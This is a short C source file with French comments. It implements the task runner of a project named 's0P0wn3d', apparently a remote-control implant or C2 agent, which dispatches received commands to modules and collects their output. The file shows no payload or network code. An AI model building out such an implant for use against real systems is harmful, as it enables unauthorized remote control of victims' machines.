/*
 * s0P0wn3d — Implémentation de l'exécuteur de tâches.
 */

#include "task_runner.h"
#include "modules.h"
#include <stdio.h>
#include <string.h>

void task_runner_execute(const task_t *task, task_result_t *result) {
    memset(result, 0, sizeof(task_result_t));

    /* Copier le task_id */
    strncpy(result->task_id, task->task_id, S0P_MAX_TASK_ID - 1);

    /* Trouver le module */
    const module_def_t *mod = modules_find(task->command);
    if (!mod) {
        strncpy(result->status, "error", sizeof(result->status) - 1);
        snprintf(result->output, S0P_MAX_OUTPUT,
                 "unknown command: %s", task->command);
        return;
    }

    /* Exécuter le module */
    char *output = mod->execute(task->args);
    strncpy(result->status, "success", sizeof(result->status) - 1);

    if (output) {
        strncpy(result->output, output, S0P_MAX_OUTPUT - 1);
        result->output[S0P_MAX_OUTPUT - 1] = '\0';
        free(output);
    }
}
